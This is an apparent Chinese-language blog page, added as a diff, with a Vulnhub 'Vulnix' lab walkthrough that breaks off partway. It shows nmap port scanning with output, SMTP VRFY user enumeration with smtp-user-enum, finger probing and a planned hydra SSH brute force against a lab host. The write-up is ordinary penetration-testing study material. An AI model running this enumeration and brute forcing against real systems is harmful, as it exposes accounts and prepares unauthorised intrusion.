@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulnhub-21Hack-Lab-Vulnix | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub-21Hack-Lab-Vulnix</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 25, 2024&nbsp;&nbsp;16:14:34</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>[TOC]</p>
+<h1 id="Vulnhub-21Hack-Lab-Vulnix"><a href="#Vulnhub-21Hack-Lab-Vulnix" class="headerlink" title="Vulnhub-21Hack-Lab-Vulnix"></a>Vulnhub-21Hack-Lab-Vulnix</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l          nmap <span class="attr">--min-rate</span> <span class="number">100000</span> -<span class="selector-tag">p</span>- -<span class="selector-tag">A</span> <span class="number">192.168</span>.<span class="number">240.131</span> </span><br></pre></td></tr></table></figure>
+
+<h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line"><span class="number">22</span>/tcp    open  ssh      OpenSSH <span class="number">5.9</span>p1 Debian <span class="number">5</span>ubuntu1 (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="type">ssh</span>-hostkey:</span><br><span class="line">|   <span class="type">1024</span> <span class="number">10</span>:cd:<span class="number">9</span>e:a0:e4:e0:<span class="number">30</span>:<span class="number">24</span>:<span class="number">3</span>e:bd:<span class="number">67</span>:<span class="number">5</span>f:<span class="number">75</span>:<span class="number">4</span>a:<span class="number">33</span>:bf (DSA)</span><br><span class="line">|   <span class="type">2048</span> bc:f9:<span class="number">24</span>:<span class="number">07</span>:<span class="number">2</span>f:cb:<span class="number">76</span>:<span class="number">80</span>:<span class="number">0</span>d:<span class="number">27</span>:a6:<span class="number">48</span>:<span class="number">52</span>:<span class="number">0</span>a:<span class="number">24</span>:<span class="number">3</span>a (RSA)</span><br><span class="line">|<span class="type">_</span>  <span class="number">256</span> <span class="number">4</span>d:bb:<span class="number">4</span>a:c1:<span class="number">18</span>:e8:da:d1:<span class="number">82</span>:<span class="number">6</span>f:<span class="number">58</span>:<span class="number">52</span>:<span class="number">9</span>c:ee:<span class="number">34</span>:<span class="number">5</span>f (ECDSA)</span><br><span class="line"><span class="number">25</span>/tcp    open  smtp     Postfix smtpd</span><br><span class="line">|<span class="type">_smtp</span>-commands: vulnix, PIPELINING, SIZE <span class="number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, <span class="number">8</span>BITMIME, DSN</span><br><span class="line"><span class="number">79</span>/tcp    open  finger   Linux fingerd</span><br><span class="line">|<span class="type">_finger</span>: No one logged on.\x0D</span><br><span class="line"><span class="number">110</span>/tcp   open  pop3     Dovecot pop3d</span><br><span class="line">|<span class="type">_ssl</span>-date: <span class="number">2024</span><span class="number">-11</span><span class="number">-25</span>T16:<span class="number">28</span>:<span class="number">26</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">8</span>h00m00s from scanner <span class="built_in">time</span>.</span><br><span class="line">|<span class="type">_pop3</span>-capabilities: PIPELINING STLS SASL CAPA TOP RESP-CODES UIDL</span><br><span class="line">| <span class="type">ssl</span>-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server</span><br><span class="line">| <span class="type">Not</span> valid <span class="built_in">before</span>: <span class="number">2012</span><span class="number">-09</span><span class="number">-02</span>T17:<span class="number">40</span>:<span class="number">22</span></span><br><span class="line">|<span class="type">_Not</span> valid <span class="built_in">after</span>:  <span class="number">2022</span><span class="number">-09</span><span class="number">-02</span>T17:<span class="number">40</span>:<span class="number">22</span></span><br><span class="line"><span class="number">111</span>/tcp   open  rpcbind  <span class="number">2</span><span class="number">-4</span> (RPC #<span class="number">100000</span>)</span><br><span class="line">| <span class="type">rpcinfo</span>:</span><br><span class="line">|   <span class="type">program</span> version    port/proto  service</span><br><span class="line">|   <span class="type">100000</span>  <span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>        <span class="number">111</span>/tcp   rpcbind</span><br><span class="line">|   <span class="type">100000</span>  <span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>        <span class="number">111</span>/udp   rpcbind</span><br><span class="line">|   <span class="type">100000</span>  <span class="number">3</span>,<span class="number">4</span>          <span class="number">111</span>/tcp6  rpcbind</span><br><span class="line">|   <span class="type">100000</span>  <span class="number">3</span>,<span class="number">4</span>          <span class="number">111</span>/udp6  rpcbind</span><br><span class="line">|   <span class="type">100005</span>  <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>      <span class="number">55466</span>/udp6  mountd</span><br><span class="line">|   <span class="type">100005</span>  <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>      <span class="number">57000</span>/tcp   mountd</span><br><span class="line">|   <span class="type">100005</span>  <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>      <span class="number">57329</span>/udp   mountd</span><br><span class="line">|   <span class="type">100005</span>  <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>      <span class="number">58695</span>/tcp6  mountd</span><br><span class="line">|   <span class="type">100021</span>  <span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>      <span class="number">42660</span>/udp6  nlockmgr</span><br><span class="line">|   <span class="type">100021</span>  <span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>      <span class="number">44738</span>/udp   nlockmgr</span><br><span class="line">|   <span class="type">100021</span>  <span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>      <span class="number">51677</span>/tcp6  nlockmgr</span><br><span class="line">|   <span class="type">100021</span>  <span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>      <span class="number">52708</span>/tcp   nlockmgr</span><br><span class="line">|   <span class="type">100024</span>  <span class="number">1</span>          <span class="number">36845</span>/tcp6  status</span><br><span class="line">|   <span class="type">100024</span>  <span class="number">1</span>          <span class="number">37674</span>/udp   status</span><br><span class="line">|   <span class="type">100024</span>  <span class="number">1</span>          <span class="number">47034</span>/tcp   status</span><br><span class="line">|   <span class="type">100024</span>  <span class="number">1</span>          <span class="number">59653</span>/udp6  status</span><br><span class="line">|   <span class="type">100227</span>  <span class="number">2</span>,<span class="number">3</span>         <span class="number">2049</span>/tcp   nfs_acl</span><br><span class="line">|   <span class="type">100227</span>  <span class="number">2</span>,<span class="number">3</span>         <span class="number">2049</span>/tcp6  nfs_acl</span><br><span class="line">|   <span class="type">100227</span>  <span class="number">2</span>,<span class="number">3</span>         <span class="number">2049</span>/udp   nfs_acl</span><br><span class="line">|<span class="type">_</span>  <span class="number">100227</span>  <span class="number">2</span>,<span class="number">3</span>         <span class="number">2049</span>/udp6  nfs_acl</span><br><span class="line"><span class="number">143</span>/tcp   open  imap     Dovecot imapd</span><br><span class="line">| <span class="type">ssl</span>-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server</span><br><span class="line">| <span class="type">Not</span> valid <span class="built_in">before</span>: <span class="number">2012</span><span class="number">-09</span><span class="number">-02</span>T17:<span class="number">40</span>:<span class="number">22</span></span><br><span class="line">|<span class="type">_Not</span> valid <span class="built_in">after</span>:  <span class="number">2022</span><span class="number">-09</span><span class="number">-02</span>T17:<span class="number">40</span>:<span class="number">22</span></span><br><span class="line">|<span class="type">_ssl</span>-date: <span class="number">2024</span><span class="number">-11</span><span class="number">-25</span>T16:<span class="number">28</span>:<span class="number">25</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">8</span>h00m00s from scanner <span class="built_in">time</span>.</span><br><span class="line">|<span class="type">_imap</span>-capabilities: have SASL-IR LOGIN-REFERRALS more post-login capabilities listed STARTTLS LITERAL+ OK ID ENABLE LOGINDISABLEDA0001 IDLE IMAP4rev1 Pre-login</span><br><span class="line"><span class="number">512</span>/tcp   open  exec     netkit-rsh rexecd</span><br><span class="line"><span class="number">513</span>/tcp   open  login?</span><br><span class="line"><span class="number">514</span>/tcp   open  shell    Netkit rshd</span><br><span class="line"><span class="number">993</span>/tcp   open  ssl/imap Dovecot imapd</span><br><span class="line">|<span class="type">_ssl</span>-date: <span class="number">2024</span><span class="number">-11</span><span class="number">-25</span>T16:<span class="number">28</span>:<span class="number">04</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">8</span>h00m00s from scanner <span class="built_in">time</span>.</span><br><span class="line">| <span class="type">ssl</span>-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server</span><br><span class="line">| <span class="type">Not</span> valid <span class="built_in">before</span>: <span class="number">2012</span><span class="number">-09</span><span class="number">-02</span>T17:<span class="number">40</span>:<span class="number">22</span></span><br><span class="line">|<span class="type">_Not</span> valid <span class="built_in">after</span>:  <span class="number">2022</span><span class="number">-09</span><span class="number">-02</span>T17:<span class="number">40</span>:<span class="number">22</span></span><br><span class="line">|<span class="type">_imap</span>-capabilities: SASL-IR LOGIN-REFERRALS more have capabilities AUTH=PLAINA0001 post-login LITERAL+ listed ID ENABLE OK IDLE IMAP4rev1 Pre-login</span><br><span class="line"><span class="number">995</span>/tcp   open  ssl/pop3 Dovecot pop3d</span><br><span class="line">|<span class="type">_pop3</span>-capabilities: PIPELINING TOP SASL(PLAIN) CAPA USER RESP-CODES UIDL</span><br><span class="line">|<span class="type">_ssl</span>-date: <span class="number">2024</span><span class="number">-11</span><span class="number">-25</span>T16:<span class="number">28</span>:<span class="number">04</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">8</span>h00m00s from scanner <span class="built_in">time</span>.</span><br><span class="line">| <span class="type">ssl</span>-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server</span><br><span class="line">| <span class="type">Not</span> valid <span class="built_in">before</span>: <span class="number">2012</span><span class="number">-09</span><span class="number">-02</span>T17:<span class="number">40</span>:<span class="number">22</span></span><br><span class="line">|<span class="type">_Not</span> valid <span class="built_in">after</span>:  <span class="number">2022</span><span class="number">-09</span><span class="number">-02</span>T17:<span class="number">40</span>:<span class="number">22</span></span><br><span class="line"><span class="number">2049</span>/tcp  open  nfs_acl  <span class="number">2</span><span class="number">-3</span> (RPC #<span class="number">100227</span>)</span><br><span class="line"><span class="number">34861</span>/tcp open  mountd   <span class="number">1</span><span class="number">-3</span> (RPC #<span class="number">100005</span>)</span><br><span class="line"><span class="number">47034</span>/tcp open  status   <span class="number">1</span> (RPC #<span class="number">100024</span>)</span><br><span class="line"><span class="number">52708</span>/tcp open  nlockmgr <span class="number">1</span><span class="number">-4</span> (RPC #<span class="number">100021</span>)</span><br><span class="line"><span class="number">56594</span>/tcp open  mountd   <span class="number">1</span><span class="number">-3</span> (RPC #<span class="number">100005</span>)</span><br><span class="line"><span class="number">57000</span>/tcp open  mountd   <span class="number">1</span><span class="number">-3</span> (RPC #<span class="number">100005</span>)</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">04</span>:C2:<span class="number">10</span> (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux <span class="number">2.6</span>.X|<span class="type">3</span>.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">2.6</span> cpe:/o:linux:linux_kernel:<span class="number">3</span></span><br><span class="line">OS details: Linux <span class="number">2.6</span><span class="number">.32</span> - <span class="number">3.10</span></span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line">Service <span class="keyword">Info</span>: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|<span class="type">_clock</span>-skew: mean: <span class="number">7</span>h59m59s, deviation: <span class="number">0</span>s, median: <span class="number">7</span>h59m59s</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">0.92</span> ms <span class="number">192.168</span><span class="number">.240</span><span class="number">.131</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">端口比较多，这太难为我了，好多端口功能都不太清楚，发挥我强大的学习能力以最少时间学习这些端口。</span><br><span class="line"><span class="number">22</span>号端口：一会尝试hydra进行爆破账号密码</span><br><span class="line"><span class="number">25、110、143</span>、<span class="number">993、995</span>：邮件服务端口</span><br><span class="line"><span class="number">79</span>：Finger服务，在本地主机执行finger命令之后，将会返回本地计算机所有的用户信息（包括用户名、最近登录时间、电话等），远程同理</span><br><span class="line"><span class="number">111</span></span><br><span class="line"><span class="number">512</span></span><br><span class="line"><span class="number">513</span></span><br><span class="line"><span class="number">514</span></span><br><span class="line"><span class="number">2049、35606</span>、<span class="number">41352、42439</span>、<span class="number">46640、54966</span>：NFS网络共享服务，通过showmount命令查看靶机的哪些目录被共享showmount -e <span class="number">192.168.240.131</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">25</span>端口 </span><br><span class="line">首先 nmap --min-rate <span class="number">100000</span> --script=*smtp* -p <span class="number">25</span> <span class="number">192.168</span>.<span class="number">240.131</span></span><br><span class="line">从中我们可以获得以下信息：</span><br><span class="line">smtp-enum-users脚本无法枚举用户</span><br><span class="line">邮件服务器并未使用Exim软件，无法使用CVE漏洞攻击（因为Exploit DB中的大部分有效漏洞都是Exim的）</span><br><span class="line">靶机的SMTP服务支持以下命令：vulnix、PIPELINING、SIZE、VRFY、ETRN、STARTTLS、ENHANCEDSTATUSCODES、<span class="number">8</span>BITMIME、DSN</span><br><span class="line"></span><br><span class="line">其中，最有价值的SMTP命令为VRFY。该命令接收一个SMTP用户名参数，并向服务器查询该用户是否存在，若输入的用户名存在则返回状态码<span class="number">252</span>，否则返回状态码<span class="number">550</span>。也就是说，我们只需要提供字典，就可以通过该命令对服务器的SMTP用户列表进行暴力破解。</span><br><span class="line">这里我们通过Kali Linux自带的smtp-enum-users工具进行破解，字典选用<span class="regexp">/usr/</span>share<span class="regexp">/wordlists/m</span>etasploit下的unix_users.txt。该字典包含了大量Linux操作系统上常见的用户名。</span><br><span class="line"></span><br><span class="line"><span class="comment"># -M  指定SMTP爆破命令</span></span><br><span class="line"><span class="comment"># -U  指定用户名字典</span></span><br><span class="line"><span class="comment"># -t  指定目标</span></span><br><span class="line">最后  smtp-user-enum -M VRFY -U <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/m</span>etasploit/unix_users.txt -t <span class="number">192.168</span>.<span class="number">240.131</span></span><br><span class="line">发现了<span class="number">28</span>个账户。其中root、ROOT和user账户比较显眼。除了root账户，判断它们是使用者而非系统建立的。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-21hack-lab-vulnix//image-20241125165820410.png" alt="image-20241125165820410"></p>
+<p><img src="/vulnhub-21hack-lab-vulnix//image-20241126222310429.png" alt="image-20241126222310429"></p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在这里我用的是一个虚拟环境</span><br><span class="line">＃python3 -m venv <span class="keyword">python</span>虚拟环境    <span class="comment">//创建一个虚拟环境</span></span><br><span class="line">＃<span class="keyword">source</span> <span class="keyword">python</span>虚拟环境/bin/activate   <span class="comment">//激活环境（Linux）    python虚拟环境\Scripts\activate.bat //激活环境（Windows）</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">79： <span class="keyword">finger</span> &#123;<span class="literal">backup</span>,bin,daemon,games,gnats,irc,landscape,libuuid,list,lp,mail,messagebus,man,news,nobody,postfix,postmaster,<span class="literal">proxy</span>,<span class="literal">root</span>,ROOT,sshd,sync,sys,syslog,user,uucp,whoopsie,www-data&#125;@192.168.240.131</span><br><span class="line">没有找到任何信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-21hack-lab-vulnix//image-20241125170137779.png" alt="image-20241125170137779"></p>
+<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">NFS服务简介</span><br><span class="line">NFS，Network File System，中文为网络文件系统。NFS服务的作用就是将服务器的文件以文件系统的形式共享给多个用户。NFS服务依赖于RPC协议。</span><br><span class="line">下面举一个比较常见的案例：在网吧或者数据中心中，管理员通常在一台中心服务器上安装NFS服务。中心服务器上共享的是局域网内所有主机的所有用户的个人目录，这样就可以节省单台主机的数据存储成本。而如果在客户端内查看当前用户的个人目录，会发现它在肉眼上和普通的目录没有区别，但实际上该目录是由NFS服务挂载的网络共享目录。</span><br><span class="line">NFS服务进程</span><br><span class="line">NFS网络文件系统会启动<span class="number">4</span>个子服务：</span><br><span class="line">portmapper，作用为将RPC程序号解释为本机的网络端口号。当客户端向其发起查询请求时，它会返回NFS mountd服务注册的端口号。</span><br><span class="line">mountd，NFS的访问控制程序。作用为检查客户机是否在NFS的访问控制列表内，并向客户端连接发放令牌。</span><br><span class="line">idmapd，NFS的用户账号集中映射程序。作用为识别客户机和服务器的系统账号信息。</span><br><span class="line">nfsd，NFS的主进程。作用为向服务器内核发送文件系统指令并返回执行结果。</span><br><span class="line"></span><br><span class="line"></span><br><span 